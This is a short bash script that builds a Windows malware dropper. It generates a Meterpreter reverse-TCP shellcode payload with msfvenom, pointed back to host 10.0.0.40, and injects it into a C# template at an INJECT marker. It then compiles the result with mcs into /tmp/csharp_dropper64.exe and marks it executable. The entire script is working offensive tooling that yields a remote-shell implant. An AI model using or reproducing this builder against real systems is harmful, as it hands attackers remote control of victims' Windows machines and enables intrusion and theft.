#!/bin/bash

SC=`msfvenom -p windows/x64/meterpreter_reverse_tcp -f csharp  --platform windows --arch x64 LHOST=10.0.0.40`

# Replae relevant lines
SC=${SC/buf/shellcode}

PRE=`grep -B 1000 INJECT csharp.template | grep -v INJECT`
POST=`grep -A 1000 INJECT csharp.template | grep -v INJECT`

# Format the output 
echo "$PRE" > csharp.cs
echo "$SC" >> csharp.cs
echo "$POST" >> csharp.cs

mcs csharp.cs -out:/tmp/csharp_dropper64.exe
chmod 755 /tmp/csharp_dropper64.exe
